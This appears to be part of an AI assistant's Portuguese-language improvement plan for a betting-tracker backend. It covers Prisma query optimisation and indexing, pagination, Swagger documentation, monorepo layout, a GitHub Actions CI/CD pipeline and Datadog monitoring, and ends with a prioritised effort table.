
#### **Problema:**

```typescript
// ❌ N+1 Query problem - apostaRoutes.ts
router.get('/apostas', authenticate, async (req, res) => {
  const apostas = await prisma.aposta.findMany({
    where: { usuarioId: req.user.userId }
  });

  // Problema: loop faz 1000 queries se houver 1000 apostas!
  for (const aposta of apostas) {
    aposta.bankroll = await prisma.bankroll.findUnique({
      where: { id: aposta.bancaroleId }
    });
  }

  res.json(apostas);
});
```

#### **Solução - Include relations:**

```typescript
// ✅ CORRETO - 1 query com joins
router.get('/apostas', authenticate, async (req, res) => {
  const apostas = await prisma.aposta.findMany({
    where: { usuarioId: req.user.userId },
    include: {
      bankroll: true,
      tipster: true,
      esporte: true
    },
    orderBy: { dataCriacao: 'desc' },
    take: 100 // Paginação!
  });

  res.json(apostas);
});
```

#### **Indexação em Prisma Schema:**

```prisma
// ✅ BackTrack/prisma/schema.prisma
model Aposta {
  id              String   @id @default(uuid())
  usuarioId       String
  bancaroleId     String
  esporteId       String
  dataCriacao     DateTime @default(now())
  valor           Float
  odd             Float
  
  usuario         User     @relation(fields: [usuarioId], references: [id])
  bankroll        Bankroll @relation(fields: [bancaroleId], references: [id])
  esporte         Esporte  @relation(fields: [esporteId], references: [id])
  
  // Índices para queries comuns
  @@index([usuarioId])
  @@index([bancaroleId])
  @@index([dataCriacao])
  @@index([usuarioId, dataCriacao]) // Compound index
}
```

#### **Query com paginação e filtros:**

```typescript
// ✅ Eficiente e escalável
router.get('/apostas', authenticate, async (req, res) => {
  const { page = 1, limit = 50, esporte, status } = req.query;
  const skip = (Number(page) - 1) * Number(limit);

  const [apostas, total] = await Promise.all([
    prisma.aposta.findMany({
      where: {
        usuarioId: req.user.userId,
        ...(esporte && { esporteId: esporte }),
        ...(status && { status })
      },
      include: { bankroll: true, tipster: true },
      orderBy: { dataCriacao: 'desc' },
      take: Number(limit),
      skip
    }),
    prisma.aposta.count({
      where: {
        usuarioId: req.user.userId,
        ...(esporte && { esporteId: esporte }),
        ...(status && { status })
      }
    })
  ]);

  res.json({
    apostas,
    pagination: {
      total,
      page: Number(page),
      limit: Number(limit),
      pages: Math.ceil(total / Number(limit))
    }
  });
});
```

#### **Impacto:**
```
❌ Antes:  1000 apostas = 1001 queries (1s de latência)
✅ Depois: 1000 apostas = 2 queries (50ms de latência)
```

---

## 🏗️ PRIORIDADE 4: MANUTENIBILIDADE (Ongoing)

### 1️⃣ Documentação API (Swagger/OpenAPI)

#### **Adicionar Swagger:**

```typescript
// ✅ BackTrack/src/server.ts
import swaggerJsdoc from 'swagger-jsdoc';
import swaggerUi from 'swagger-ui-express';

const swaggerOptions = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'RealTrack API',
      version: '1.0.0',
      description: 'API de rastreamento de apostas esportivas'
    },
    servers: [
      {
        url: process.env.NODE_ENV === 'production' 
          ? 'https://api.realtracker.site'
          : 'http://localhost:3001'
      }
    ],
    components: {
      securitySchemes: {
        BearerAuth: {
          type: 'http',
          scheme: 'bearer'
        }
      }
    }
  },
  apis: ['./src/routes/*.ts']
};

const specs = swaggerJsdoc(swaggerOptions);
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(specs));
```

#### **Documentar rotas:**

```typescript
// ✅ BackTrack/src/routes/auth.routes.ts
/**
 * @openapi
 * /api/auth/register:
 *   post:
 *     tags:
 *       - Auth
 *     summary: Registrar novo usuário
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - nomeCompleto
 *               - email
 *               - senha
 *             properties:
 *               nomeCompleto:
 *                 type: string
 *                 example: "João Silva"
 *               email:
 *                 type: string
 *                 format: email
 *               senha:
 *                 type: string
 *                 format: password
 *     responses:
 *       200:
 *         description: Usuário criado com sucesso
 *       400:
 *         description: Email já cadastrado
 */
router.post('/register', ...)
```

---

### 2️⃣ Monorepo setup

#### **Estrutura:**

```
monorepo/
├── packages/
│   ├── backend/          (BackTrack)
│   ├── frontend/         (RealTrack)
│   ├── ocr-pipeline/     (bilhete-tracker)
│   └── shared/
│       ├── types/        (tipos compartilhados)
│       ├── schemas/      (Zod schemas)
│       └── utils/        (funções utilitárias)
├── docs/
├── package.json          (workspace root)
└── pnpm-workspace.yaml
```

#### **pnpm-workspace.yaml:**

```yaml
packages:
  - 'packages/*'
  - 'docs'
```

---

### 3️⃣ CI/CD pipelines

#### **GitHub Actions:**

```yaml
# ✅ .github/workflows/test.yml
name: Test & Build

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: pnpm/action-setup@v2
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'pnpm'
      
      - run: pnpm install
      - run: pnpm -r run lint
      - run: pnpm -r run test
      - run: pnpm -r run build

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Deploy Backend
        run: |
          # Deploy BackTrack ao Render
          curl -X POST https://api.render.com/deploy/...
```

---

### 4️⃣ Monitoring + Alertas

#### **Datadog/New Relic:**

```typescript
// ✅ BackTrack/src/config/monitoring.ts
import dd from 'dd-trace';

dd.init({
  service: 'realtrack-backend',
  env: process.env.NODE_ENV,
  logInjection: true
});

export const tracer = dd.tracer;
```

---

## 📊 RESUMO EXECUTIVO

| Prioridade | Item | Funções | Impacto | Tempo |
|-----------|------|---------|--------|-------|
| **1** | console.log removal | 36 pontos | 🔴 Segurança | 1h |
| **1** | Consolidar auth | 2 arquivos | 🔴 Segurança | 2h |
| **1** | Zod validation | .env | 🔴 Segurança | 3h |
| **1** | httpOnly cookies | AuthManager | 🔴 Segurança | 4h |
| **2** | Testes | ~10 funções | 🟡 Qualidade | 20h |
| **2** | Services | AuthService | 🟡 Qualidade | 8h |
| **2** | Health checks | /health/* | 🟡 Qualidade | 3h |
| **3** | Retry + Cache | ocrClient | 🟢 Performance | 6h |
| **3** | Code splitting | vite.config.ts | 🟢 Performance | 2h |
| **3** | DB optimization | queries | 🟢 Performance | 5h |
| **4** | Swagger | routes | 🔵 Docs | 4h |

**Total Estimado: 58 horas = ~2 semanas de desenvolvimento**

---

Quer que eu **comece a implementar** a PRIORIDADE 1 (Segurança)? 🚀
